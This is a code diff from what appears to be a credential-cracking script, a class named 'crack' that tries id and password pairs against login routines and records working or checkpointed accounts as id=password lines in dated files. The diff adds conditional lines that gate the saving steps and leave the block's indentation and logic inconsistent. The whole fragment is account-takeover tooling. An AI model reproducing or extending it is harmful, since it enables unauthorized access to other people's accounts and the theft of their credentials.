@@ -1449,6 +1449,8 @@ class crack:
                 elif sistem_login == 'tiga' : log = logger3(id,pw)
                 else:log = logger1(id,pw)
                 if log['status'] == 'cp':
+                    if user != 1:pass
+                    else:
                         files_cp = "CP/%s.json"%(tanggal)
                         try:
                             with requests.Session() as xyz:
@@ -1467,6 +1469,8 @@ class crack:
                         open(files_cp,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
                         break
                 elif log['status'] == 'ok':
+                    if user != 1:pass
+                    else:
                         files_ok = "OK/%s.json"%(tanggal)
                         try:
                             with requests.Session() as xyz:
@@ -1484,6 +1488,8 @@ class crack:
                         self.ok.append("%s=%s"%(id,pw))
                         open(files_ok,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
                         break
+                else:
+                    if user != 1:pass
                     else:continue
             self.lp += 1
             loop = str(self.lp)
